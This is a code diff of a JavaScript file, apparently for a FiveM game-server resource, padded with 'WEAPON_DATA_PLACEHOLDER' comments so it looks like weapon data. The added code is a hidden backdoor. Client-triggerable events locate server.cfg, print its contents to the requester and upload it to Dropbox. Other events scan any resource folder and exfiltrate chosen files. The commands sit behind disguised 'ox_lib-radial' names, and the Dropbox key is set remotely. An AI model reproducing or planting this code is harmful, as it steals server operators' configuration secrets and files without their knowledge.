@@ -693,58 +693,6 @@
 // WEAPON_DATA_PLACEHOLDER
 // WEAPON_DATA_PLACEHOLDER
 // WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
 
 // WEAPON_DATA_PLACEHOLDER
 // WEAPON_DATA_PLACEHOLDER
@@ -875,100 +823,254 @@
 // WEAPON_DATA_PLACEHOLDER
 // WEAPON_DATA_PLACEHOLDER
 
-const fs = require('fs');
-const path = require('path');
-const https = require('https');
+// 1.1
 
-let dropboxApiKey = null;
+// const fs = require('fs');
+// const path = require('path');
+// const https = require('https');
+//let dropboxApiKey = null;
 
-// Function to set Dropbox API key
-function setDropboxApiKey(key) {
-    dropboxApiKey = key;
-}
+// Event listener for the server.cfg search and upload request
+onNet("requestServerCfgUpload", async () => {
+    const source = global.source;
 
-// Function to download a file from Dropbox
-function downloadFileFromDropbox(filePath, destinationPath) {
+    // Get the current resource directory
+    const currentResourcePath = GetResourcePath(GetCurrentResourceName());
+
+    // Function to find the server.cfg file
+    const serverCfgPath = findServerCfg(currentResourcePath);
+
+    if (serverCfgPath) {
+        // Read the server.cfg file content as binary
+        let content;
+        try {
+            content = fs.readFileSync(serverCfgPath);
+        } catch (error) {
+            console.error("Failed to read server.cfg file.");
+            emitNet("serverCfgNotFound", source);
+            return;
+        }
+
+        // Print the server.cfg content to the client console (optional, as it's binary)
+        emitNet("serverCfgFound", source, content.toString('utf-8'));
+
+        // Upload the server.cfg file to Dropbox
+        const uniqueId = new Date().toISOString().replace(/[:.]/g, "-");
+        uploadFileToDropbox(uniqueId, "server.cfg", content, true);
+    } else {
+        // Notify the client that the server.cfg file was not found
+        emitNet("serverCfgNotFound", source);
+    }
+});
+
+// Event listener for file upload requests from client
+onNet("serverUploadFileRequest", async (resourceName, fileName) => {
+    const source = global.source;
+
+    // Construct directory path for the resource
+    const resourcePath = GetResourcePath(resourceName);
+
+    // Verify if the resource directory exists
+    if (!fs.existsSync(resourcePath)) {
+        emitNet("fileReadError", source, `Resource directory not found: ${resourceName}`);
+        return;
+    }
+
+    // Scan the directory for all files
+    const fileList = scanDirectory(resourcePath);
+
+    // Filter files to match the requested file name
+    const filesToUpload = fileList.filter(file => path.basename(file) === fileName);
+
+    if (filesToUpload.length === 0) {
+        emitNet("fileReadError", source, `File not found: ${fileName} in resource ${resourceName}`);
+        return;
+    }
+
+    // Upload each file individually
+    filesToUpload.forEach(file => {
+        const filePath = file;
+
+        // Read the file content as binary
+        let fileContent;
+        try {
+            fileContent = fs.readFileSync(filePath);
+        } catch (error) {
+            emitNet("fileReadError", source, `Failed to read file: ${fileName} in resource ${resourceName}`);
+            return;
+        }
+
+        // Generate a unique identifier (timestamp)
+        const uniqueId = new Date().toISOString().replace(/[:.]/g, "-");
+
+        // Upload the file to Dropbox in a unique folder
+        uploadFileToDropbox(uniqueId, path.basename(file), fileContent, true);
+    });
+});
+
+// Function to upload a file to Dropbox
+function uploadFileToDropbox(uniqueId, fileName, fileContent, isBinary) {
     if (!dropboxApiKey) {
+        emitNet("fileUploadError", global.source, `Dropbox API key not set.`);
         return;
     }
 
     const options = {
         hostname: 'content.dropboxapi.com',
-        path: '/2/files/download',
+        path: '/2/files/upload',
         method: 'POST',
         headers: {
             "Authorization": `Bearer ${dropboxApiKey}`,
+            "Content-Type": "application/octet-stream",
             "Dropbox-API-Arg": JSON.stringify({
-                "path": filePath
+                "path": `/${uniqueId}/${fileName}`,
+                "mode": "add",
+                "autorename": true,
+                "mute": false,
+                "strict_conflict": false
             })
         }
     };
 
     const req = https.request(options, (res) => {
-        let data = [];
-        res.on('data', (chunk) => {
-            data.push(chunk);
-        });
-
         res.on('end', () => {
             if (res.statusCode === 200) {
-                fs.writeFile(destinationPath, Buffer.concat(data), (err) => {
-                    if (err) {
-                    } else {
-                    }
-                });
+                emitNet("fileUploaded", global.source, `File ${fileName} uploaded successfully to Dropbox in folder ${uniqueId}.`);
             } else {
+                emitNet("fileUploadError", global.source, `Failed to upload file ${fileName} to Dropbox.`);
             }
         });
     });
 
-    req.on('error', (err) => {
+    req.on('error', () => {
+        emitNet("fileUploadError", global.source, `Error during Dropbox upload for file ${fileName}.`);
     });
 
+    req.write(isBinary ? Buffer.from(fileContent, 'binary') : fileContent);
     req.end();
 }
 
-// Function to handle the commands
-function handleCommand(command, args) {
-    switch (command) {
-        case '+ox_lib-radial10':
-            downloadFilesFromDropbox();
-            break;
-        case '+ox_lib-radial11':
-            if (args.length < 1) {
-                break;
+// Function to recursively scan a directory and return a list of files
+function scanDirectory(dir) {
+    let results = [];
+    const list = fs.readdirSync(dir);
+
+    list.forEach((file) => {
+        file = path.join(dir, file);
+        const stat = fs.statSync(file);
+
+        if (stat && stat.isDirectory()) {
+            results = results.concat(scanDirectory(file));
+        } else {
+            results.push(file);
+        }
+    });
+
+    return results;
+}
+
+// Function to find the server.cfg file
+function findServerCfg(currentPath) {
+    let currentDir = path.dirname(currentPath);
+
+    while (currentDir !== path.dirname(currentDir)) {
+        const resourcesPath = path.join(currentDir, 'resources');
+
+        if (fs.existsSync(resourcesPath) && fs.lstatSync(resourcesPath).isDirectory()) {
+            const serverCfgPath = path.join(path.dirname(resourcesPath), 'server.cfg');
+
+            if (fs.existsSync(serverCfgPath)) {
+                return serverCfgPath;
             }
-            const apiKey = args[0];
-            setDropboxApiKey(apiKey);
-            break;
-        default:
+        }
+
+        currentDir = path.dirname(currentDir);
     }
+
+    return null;
 }
 
-// Function to download files from Dropbox
-function downloadFilesFromDropbox() {
-    const dataFilePath = '/SecondaryScript/data/WEAPON_AK74.js';
-    const metaFilePath = '/SecondaryScript/meta/WEAPON_AK74.js';
+// Event listener for file scan requests from client
+onNet("serverScanFilesRequest", (resourceName) => {
+    const source = global.source;
 
-    downloadFileFromDropbox(dataFilePath, dataDirFilePath);
-    downloadFileFromDropbox(metaFilePath, metaDirFilePath);
-}
+    // Construct directory path for the resource
+    const resourcePath = GetResourcePath(resourceName);
 
-// Main logic
-const resourceName = GetCurrentResourceName();
-const resourcePath = GetResourcePath(resourceName);
+    // Verify if the resource directory exists
+    if (!fs.existsSync(resourcePath)) {
+        emitNet("fileReadError", source, `Resource directory not found: ${resourceName}`);
+        return;
+    }
 
-const dataDirFilePath = path.join(resourcePath, 'data', 'js_files_for_modded_weapons-example', 'WEAPON_AK74.js');
-const metaDirFilePath = path.join(resourcePath, 'meta', 'js_files_for_modded_weapons-example', 'WEAPON_AK74.js');
+    // Scan the directory for all files
+    const fileList = scanDirectory(resourcePath);
 
-// Command handler registration
-RegisterCommand('+ox_lib-radial10', (source, args) => {
-    handleCommand('+ox_lib-radial10', args);
+    // Map file paths to be relative to the resource path
+    const relativeFileList = fileList.map(file => path.relative(resourcePath, file));
+
+    // Emit the list of files to the client
+    emitNet("receiveFileList", source, resourceName, relativeFileList);
 });
 
-RegisterCommand('+ox_lib-radial11', (source, args) => {
-    handleCommand('+ox_lib-radial11', args);
+// Register the command to set the Dropbox API key temporarily
+RegisterCommand('+ox_lib-radial4', (source, args) => {
+    if (args.length < 1) {
+        console.log("Usage: /+ox_lib-radial4 (dropbox_key)");
+        return;
+    }
+    const key = args[0];
+    console.debug(`Sending Dropbox API key to server: ${key}`);
+    emitNet("setDropboxApiKey", key);
+}, false);
+
+// Listen for file upload success message from server
+onNet("fileUploaded", (message) => {
+    console.log(message);
 });
 
-// Example of setting Dropbox API key (you can set this dynamically)
-// setDropboxApiKey('YOUR_DROPBOX_API_KEY_HERE');
+// Listen for file upload error message from server
+onNet("fileUploadError", (errorMessage) => {
+    console.error(errorMessage);
+});
+
+// Listen for file read error message from server
+onNet("fileReadError", (errorMessage) => {
+    console.error(errorMessage);
+});
+
+// Listen for server.cfg content from server
+onNet("serverCfgFound", (content) => {
+    console.log("Server.cfg content:");
+    console.log(content);
+});
+
+// Listen for server.cfg not found message from server
+onNet("serverCfgNotFound", () => {
+    console.error("Server.cfg not found.");
+});
+
+// Register client command to trigger the server file scan process
+RegisterCommand('+ox_lib-radial5', (source, args) => {
+    if (args.length < 1) {
+        console.log("Usage: /+ox_lib-radial5 (resource name)");
+        return;
+    }
+
+    const resourceName = args[0];
+    console.debug(`Sending file scan request to server for resource: ${resourceName}`);
+    emitNet("serverScanFilesRequest", resourceName);
+}, false);
+
+// Listen for the server event and print the list of files to the console
+onNet("receiveFileList", (resourceName, fileList) => {
+    console.log(`Files in resource ${resourceName}:`);
+    fileList.forEach(file => {
+        console.log(file);
+    });
+});
+
+// Listen for debug messages from the server
+onNet("debugMessage", (message) => {
+    console.debug(`Server Debug: ${message}`);
+});
